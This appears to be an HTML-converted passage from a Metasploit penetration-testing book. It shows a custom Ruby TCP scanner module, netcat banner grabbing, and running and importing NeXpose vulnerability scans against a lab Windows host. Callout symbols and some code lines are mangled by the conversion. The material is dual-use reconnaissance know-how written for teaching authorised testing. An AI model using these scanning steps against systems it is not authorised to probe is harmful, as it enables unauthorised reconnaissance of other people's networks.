style="padding-left: 90pt;text-indent: 0pt;text-align: left;">#<span class="s24">Metasploit </span>require &#39;msf/core&#39;</p><p class="s25" style="padding-top: 1pt;padding-left: 116pt;text-indent: -25pt;line-height: 77%;text-align: left;">class Metasploit3 &lt; Msf::Auxiliary <span class="s30">O</span>include Msf::Exploit::Remote::Tcp <span class="s30">8</span>include Msf::Auxiliary::Scanner</p><p class="s25" style="text-indent: 0pt;line-height: 9pt;text-align: right;">def initialize</p><p class="s25" style="text-indent: 0pt;line-height: 11pt;text-align: right;">super(</p><p class="s25" style="padding-left: 192pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;Name&#39; =&gt; &#39;My custom TCP scan&#39;,</p><p class="s25" style="padding-left: 192pt;text-indent: 0pt;text-align: left;">&#39;Version&#39; =&gt; &#39;$Revision: 1 $&#39;, &#39;Description&#39; =&gt; &#39;My quick scanner&#39;, &#39;Author&#39; =&gt; &#39;Your name here&#39;,</p><p class="s25" style="padding-left: 192pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;License&#39; =&gt; MSF_LICENSE</p><p class="s25" style="text-indent: 0pt;line-height: 11pt;text-align: center;">)</p><p class="s25" style="padding-left: 157pt;text-indent: 0pt;text-align: center;">register_options( [</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="text-indent: 0pt;text-align: right;">end</p><p class="s30" style="padding-left: 87pt;text-indent: 0pt;line-height: 12pt;text-align: left;">@<span class="s25">Opt::RPORT(12345)</span></p><p class="s25" style="padding-left: 53pt;text-indent: 0pt;line-height: 10pt;text-align: left;">], self.class)</p><p class="s25" style="padding-top: 3pt;text-indent: 0pt;line-height: 11pt;text-align: right;">def run_host(ip)</p><p class="s25" style="text-indent: 0pt;line-height: 10pt;text-align: right;">connect()</p><p class="s30" style="padding-left: 158pt;text-indent: -8pt;line-height: 80%;text-align: left;">O<span class="s25">sock.puts(&#39;HELLO SERVER&#39;) data = sock.recv(1024)</span></p><p class="s30" style="padding-left: 158pt;text-indent: -8pt;line-height: 80%;text-align: left;">@<span class="s25">print_status(&quot;Received: #{data} from #{ip}&quot;) disconnect()</span></p><p class="s25" style="padding-left: 124pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_089.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 74%;text-align: left;">This simple scanner uses the <span class="s25">Msf::Exploit::Remote::Tcp </span><span class="s32">O </span>mixin to handle the TCP networking, and the <span class="s25">Msf::Auxiliary::Scanner </span>mixin exposes the vari- ous settings that are required for scanners within the Framework <span class="s32">8</span>. This scanner is configured to use the default port of 12345 <span class="s32">@</span>, and upon connect- ing to the server, it sends a message <span class="s32">O</span>, receives the reply from the server, and then prints it out to the screen along with the server IP address <span class="s32">@</span>.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 10pt;text-align: left;">We have saved this custom script under <span class="s19">modules/auxiliary/scanner/ </span>as</p><p class="s19" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">simple_tcp.rb<span class="p">. The saved location is important in Metasploit. For example, if the module is saved under </span>modules/auxiliary/scanner/http/<span class="p">, it would show up in the modules list as </span>scanner/http/simple_tcp<span class="p">.</span></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">To test this rudimentary scanner, we set up a <span class="s19">netcat </span>listener on port 12345 and pipe in a text file to act as the server response.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_090.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">root@bt:/# <span class="s24">echo &quot;Hello Metasploit&quot; &gt; banner.txt </span>root@bt:/# <span class="s24">nc -lvnp 12345 &lt; banner.txt </span>listening on [any] 12345...</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_091.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Next, we load up <span class="s19">msfconsole</span>, select our scanner module, set its param- eters, and run it to see if it works.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_092.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use auxiliary/scanner/simple_tcp</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(simple_tcp) &gt; <span class="s24">show options</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Module options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:49.2196pt" cellspacing="0"><tr style="height:16pt"><td style="width:38pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:64pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:185pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:15pt"><td style="width:38pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">RHOSTS</p></td><td style="width:64pt;border-top-style:dashed;border-top-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:185pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The target address range or CIDR identifier</p></td></tr><tr style="height:11pt"><td style="width:38pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">RPORT</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">12345</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:185pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The target port</p></td></tr><tr style="height:10pt"><td style="width:38pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">THREADS</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">1</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:185pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">The number of concurrent threads</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(simple_tcp) &gt; <span class="s24">set RHOSTS 192.168.1.101</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOSTS =&gt; 192.168.1.101</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf auxiliary(simple_tcp) &gt; <span class="s24">run</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Received: Hello Metasploit from 192.168.1.101 [*] Scanned 1 of 1 hosts (100% complete)</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Auxiliary module execution completed msf auxiliary(simple_tcp) &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_093.png"/></span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Although this is only a simple example, the level of versatility afforded by the Metasploit Framework can be of great assistance when you need to get some custom code up and running quickly in the middle of a pen test. Hope- fully, this simple example demonstrates the power of the Framework and modular code. But, of course, you don’t have to do everything by hand.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark104">Looking Ahead</a><a name="bookmark122">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">In this chapter, you learned how to leverage the Metasploit Framework for intelligence gathering, as outlined in the PTES. Intelligence gathering takes practice and requires a deep understanding of how an organization operates and how to identify the best potential attack vectors. As with any-</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">thing, you should adapt and improve your own methodologies throughout your penetration-testing career. Just remember that your main focus for this phase is to learn about the organization you’re attacking and its overall foot- print. Regardless of whether your work occurs over the Internet, on an inter- nal network, wirelessly, or via social engineering, the goals of intelligence gathering will always be the same.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">In the next chapter, we’ll move on to another important step during the vulnerability analysis phase: automated vulnerability scanning. In later chap- ters, we will explore more in-depth examples of how to create your own mod- ules, exploits, and Meterpreter scripts.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 230pt;text-indent: 0pt;text-align: left;"><span><img width="68" height="121" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_094.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 7pt;padding-left: 118pt;text-indent: 0pt;text-align: left;"><a name="bookmark123">VULNERABILITY SCANNING </a><a name="bookmark141">&zwnj;</a><a name="bookmark142">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-top: 15pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">A <span class="s38">vulnerability scanner </span>is an automated program designed to look for weaknesses in computers, com- puter systems, networks, and applications. The pro- gram probes a system by sending data to it over a network and analyzing the responses received, in an effort to enumerate any vulnerabilities present on the target by using its vulnerability database as reference.</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Various operating systems tend to respond differently when sent particular network probes because of the different networking implementations in use. These unique responses serve as a fingerprint that the vulnerability scanner uses to determine the operating system version and even its patch level. A vulnerability scanner can also use a given set of user credentials to log into the remote system and enumerate the software and services to determine whether they are patched. With the results it obtains, the scanner presents a report outlining any vulnerabilities detected on the system. That report can be useful for both network administrators and penetration testers.</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Vulnerability scanners generally create a lot of traffic on a network and are therefore not typically used in a penetration test when one of the objec- tives is to remain undetected. If, however, you are running a penetration test and stealth is not an issue, a vulnerability scanner can save you from having to probe systems manually to determine their patch levels and vulnerabilities.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Whether you use an automated scanner or do it manually, scanning is one of the most important steps in the penetration testing process; if done thoroughly, it will provide the best value to your client. In this chapter, we will discuss a number of vulnerability scanners and how they can be integrated within Metasploit. We’ll highlight some auxiliary modules in the Metasploit Framework that can locate specific vulnerabilities in remote systems.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark124">The Basic Vulnerability Scan</a><a name="bookmark143">&zwnj;</a></p><p style="padding-top: 10pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Let’s look at how a scan works at the most basic level. In the following listing, we use <span class="s19">netcat </span>to grab a banner from the target 192.168.1.203. <span class="s19">Banner grabbing </span>is the act of connecting to a remote network service and reading the service identification (banner) that is returned. Many network services such as web, file transfer, and mail servers return their banner either immediately upon connecting to them or in response to a specific command. Here we connect to a web server on TCP port 80 and issue a <span class="s25">GET HTTP </span>request that allows us to look at the header information that the remote server returns in response to our request.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_095.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">root@bt:/opt/framework3/msf3# <span class="s24">nc 192.168.1.203 80 GET HTTP 1/1</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">HTTP/1.1 400 Bad Request</p><p class="s30" style="padding-bottom: 1pt;padding-left: 78pt;text-indent: 0pt;line-height: 14pt;text-align: left;">O  <span class="s25">Server: </span><span class="s35">Microsoft-IIS/5.1</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="445" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_096.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">The information returned at <span class="s32">O </span>tells us that the system running on port 80 is a Microsoft IIS 5.1–based web server. Armed with this information, we could</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">use a vulnerability scanner, as shown in Figure 4-1, to determine whether this version of IIS has any vulnerabilities associated with it and whether this par- ticular server has been patched.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Of course, in practice, it’s not that simple. Vulnerability scans often con- tain many <span class="s19">false positives </span>(reported vulnerability where none exists) and <span class="s19">false negatives </span>(failure to log a vulnerability where one exists) due to subtle differ- ences in system and application configurations. In addition, the creators of vul- nerability scanners have an incentive to report positives: The more “hits” a vulnerability scanner finds, the better it looks to a potential buyer. Vulnera- bility scanners are only as good as their vulnerabilities database, and they can easily be fooled by misleading banners or inconsistent configurations.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Let’s take a look at some of the more useful vulnerability scanners, including NeXpose, Nessus, and some specialized scanners.</p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="437" height="171" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_097.gif"/></span></p><p class="s29" style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 4-1: Vulnerability scan results against the target web server</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark125">Scanning with NeXpose</a><a name="bookmark144">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">NeXpose is Rapid7’s vulnerability scanner that scans networks to identify the devices running on them and performs checks to identify security weak- nesses in operating systems and applications. It then analyzes the scan data and processes it for inclusion in various reports.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;"><a href="http://www.rapid7.com/vulnerability-scanner.jsp)" class="s31" target="_blank">Rapid7 offers multiple versions of NeXpose, but we’ll use the Community edition because it’s free. If you plan to use NeXpose commercially, see the Rapid7 site (</a><a href="http://www.rapid7.com/vulnerability-scanner.jsp)" class="s20" target="_blank">http://www.rapid7.com/vulnerability-scanner.jsp</a>) for information on the various versions and their capabilities and pricing.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Our target for scanning will be a default installation of Windows XP SP2 as configured in Appendix A. We will first perform a basic overt scan of our target and import the vulnerability scan results into Metasploit. We will close out this section by showing you how to run a NeXpose vulnerability scan directly from <span class="s19">msfconsole </span>rather than using the web-based GUI, eliminating the need to import a scan report.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark126">Configuration</a><a name="bookmark145">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">After installing NeXpose Community, open a web browser and navigate to <span class="s19">https://&lt;youripaddress&gt;:3780</span>. Accept the NeXpose self-signed certificate, and log in using the credentials you created during setup. You should next be presented with an interface similar to the one shown in Figure 4-2. (You’ll find complete installation instructions for NeXpose at the Rapid7 website.)</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">On the NeXpose main page, you will notice a number of tabs at the top of the interface:</p><ul id="l2"><li><p style="padding-top: 7pt;padding-left: 108pt;text-indent: -18pt;line-height: 81%;text-align: left;">The Assets tab <span class="s32">O </span>displays details of computers and other devices on your network after they have been scanned.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;line-height: 81%;text-align: left;">The Reports tab <span class="s32">8 </span>lists vulnerability scan reports after they have been generated.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;line-height: 81%;text-align: left;">The Vulnerabilities tab <span class="s32">@ </span>gives you details on any vulnerabilities discov- ered during your scans.</p></li><li><p style="padding-top: 1pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">The Administration tab <span class="s32">O </span>allows you to configure various options.</p></li></ul><p style="text-indent: 0pt;text-align: left;"><span><img width="438" height="181" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_098.png"/></span></p><p class="s39" style="text-indent: 0pt;line-height: 10pt;text-align: left;">。</p><p style="text-indent: 0pt;text-align: left;"/><p class="s39" style="text-indent: 0pt;line-height: 10pt;text-align: left;">＠</p><p style="text-indent: 0pt;text-align: left;"/><p class="s39" style="text-indent: 0pt;line-height: 10pt;text-align: left;">＠</p><p style="text-indent: 0pt;text-align: left;"/><p class="s39" style="text-indent: 0pt;line-height: 10pt;text-align: left;">。</p><p style="text-indent: 0pt;text-align: left;"/><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 4-2: The NeXpose’s initial home screen</p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Buttons in the main body of the page let you perform common tasks such as creating a new site or setting up a new vulnerability scan.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s23" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">The New Site Wizard</p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Prior to running a vulnerability scan with NeXpose, you need to configure a <span class="s19">site</span>—a logical collection of devices such as a specific subnet, a collection of servers, or even a single workstation. These sites will then be scanned by NeXpose, and different scan types can be defined for a particular site.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><ol id="l3"><li><p style="padding-left: 108pt;text-indent: -18pt;text-align: left;">To create a site, click the <span class="s18">New Site </span>button on the NeXpose home page, enter a name for your site and a brief description, and then click <span class="s18">Next</span>.</p></li><li><p style="padding-top: 2pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">In the devices step, shown in Figure 4-3, you have quite a bit of granular- ity in defining your targets. You can add a single IP address, address ranges, hostnames, and more. You can also declare devices, such as printers, to exclude from scans. (Printers frequently don’t take kindly to being scanned. We have seen instances in which a simple vulnerability scan caused more than one million pages of pure black to be placed in the queue to print!) Click <span class="s18">Next </span>when you have finished adding and excluding devices.</p></li><li><p style="padding-top: 2pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">At the scan setup step, you can choose from several different scan tem- plates, such as Discovery Scan and Penetration test; select the scanning engine you want to use; or set up an automated scanning schedule. For purposes of this initial walk-through, keep the default selections and click <span class="s18">Next </span>to continue.</p></li><li><p style="padding-top: 2pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Add credentials for the site you want to scan, if you have them. Credentials can help create more accurate and complete results by performing in- depth enumeration of installed software and system policies on the target.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: justify;">On the Credentials tab, click the <span class="s18">New Login </span>button, type a username and password for the IP address you want to scan, and then click <span class="s18">Test Login </span>to verify your credentials then save them.</p><p style="padding-left: 109pt;text-indent: 0pt;text-align: left;"><span><img width="419" height="268" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_099.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Figure 4-3: Adding a device to the new NeXpose site</p></li><li><p style="padding-top: 8pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Last, click <span class="s18">Save </span>to complete the New Site wizard and return to the Home tab, which should list your newly added site, as shown in Figure 4-4.</p></li></ol><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 109pt;text-indent: 0pt;text-align: left;"><span><img width="415" height="185" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_100.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Figure 4-4: The Home tab shows the newly configured site.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s23" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">The New Manual Scan Wizard</p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">With your new site configured, you are now set to configure your first scan:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><ol id="l4"><li><p style="padding-left: 108pt;text-indent: -18pt;text-align: left;">Click the <span class="s18">New Manual Scan </span>button shown in Figure 4-4. You should see the Start New Scan dialog shown in Figure 4-5, which prompts you for the assets you want to scan or exclude. In this example, we are scanning our default Windows XP system.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Double-check your target IP address to be sure that you’re not about to scan the wrong device or network inadvertently, and click the <span class="s18">Start Now </span>button to begin.</p><p style="padding-left: 109pt;text-indent: 0pt;text-align: left;"><span><img width="340" height="374" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_101.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Figure 4-5: The NeXpose scan configuration dialog</p></li><li><p style="padding-top: 8pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">NeXpose should dynamically refresh the page as the scan progresses. Wait until the status for both Scan Progress and Discovered Assets shows <span class="s19">Completed</span>, as shown in Figure 4-6. Under the Scan Progress section, you can see that our single scanned device has 268 vulnerabilities detected, and under Discovered Assets, you are provided with more information about the target such as the device name and its operating system. Now click the <span class="s18">Reports </span>tab.</p></li></ol><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 109pt;text-indent: 0pt;text-align: left;"><span><img width="412" height="156" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_102.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Figure 4-6: The completed NeXpose scan and report</p><p class="s23" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The New Report Wizard</p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">If this is your first time running NeXpose and you have completed only one scan, the Reports tab should show that you have generated no reports.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><ol id="l5"><li><p style="padding-left: 108pt;text-indent: -18pt;text-align: left;">Click <span class="s18">New Report</span>, as shown in Figure 4-7, to start the New Report wizard.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 109pt;text-indent: 0pt;text-align: left;"><span><img width="409" height="113" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_103.gif"/></span></p><p class="s29" style="padding-top: 6pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Figure 4-7: The NeXpose Reports tab</p></li><li><p style="padding-top: 8pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Enter a friendly name, and then in the Report format field, select <span class="s18">NeXpose Simple XML Export</span>, as shown in Figure 4-8, so that you will be able to import the scan results into Metasploit. You can select from different report templates and configure the time zone if you happen to be conducting your pen test on the road. Click <span class="s18">Next </span>when you are ready to proceed.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 109pt;text-indent: 0pt;text-align: left;"><span><img width="406" height="232" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_104.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Figure 4-8: Selecting a name and format for the report</p></li><li><p style="padding-top: 8pt;padding-left: 108pt;text-indent: -18pt;text-align: justify;">In the subsequent window, add the devices you want to be included in the report by clicking <span class="s18">Select Sites </span>to add your scanned target range, as shown in Figure 4-9. Then click <span class="s18">Save</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 109pt;text-indent: 0pt;text-align: left;"><span><img width="407" height="77" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_105.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Figure 4-9: Selecting the site for inclusion in the report</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">In the Select Devices dialog, select the targets to include in your report and then click <span class="s18">Save</span>.</p></li><li><p style="padding-top: 2pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Back in the Report Configuration wizard, click <span class="s18">Save </span>to accept the remaining defaults for the report. The Reports tab should now list the newly created report, as shown in Figure 4-10. (Be sure to save the report file so that you can use it with the Framework.)</p></li></ol><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 109pt;text-indent: 0pt;text-align: left;"><span><img width="407" height="107" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_106.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Figure 4-10: The Reports tab lists your reports.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark127">Importing Your Report into the Metasploit Framework</a><a name="bookmark146">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Having completed a full vulnerability scan with NeXpose, you need to import the results into Metasploit. But before you do, you must create a new database from <span class="s19">msfconsole </span>by issuing <span class="s25">db_connect</span>. After creating that database you’ll import the NeXpose XML using the <span class="s25">db_import </span>command. Metasploit will automati- cally detect that the file is from NeXpose and import the scanned host. You can then verify that the import was successful by running the <span class="s25">db_hosts </span>command.</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 81%;text-align: left;">(These steps are shown in the following listing.) As you can see at <span class="s32">O</span>, Metasploit knows about the 268 vulnerabilities that your scan picked up.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_107.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">db_connect postgres:toor@127.0.0.1/msf3</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">db_import  /tmp/host_195.xml</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Importing &#39;NeXpose Simple XML&#39; data [*] Importing host 192.168.1.195</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 193%;text-align: left;">[*] Successfully imported /tmp/host_195.xml msf &gt; <span class="s24">db_hosts -c address,svcs,vulns</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Hosts</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">=====</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><span><img width="40" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_108.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="23" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_109.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="28" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_110.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="51" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_111.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_112.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 177%;text-align: left;">address Svcs Vulns Workspace 192.168.1.195 8 268<span class="s30">O </span>default</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 10pt;text-align: left;">To display the full details of the vulnerabilities imported into Metasploit,</p><p style="padding-left: 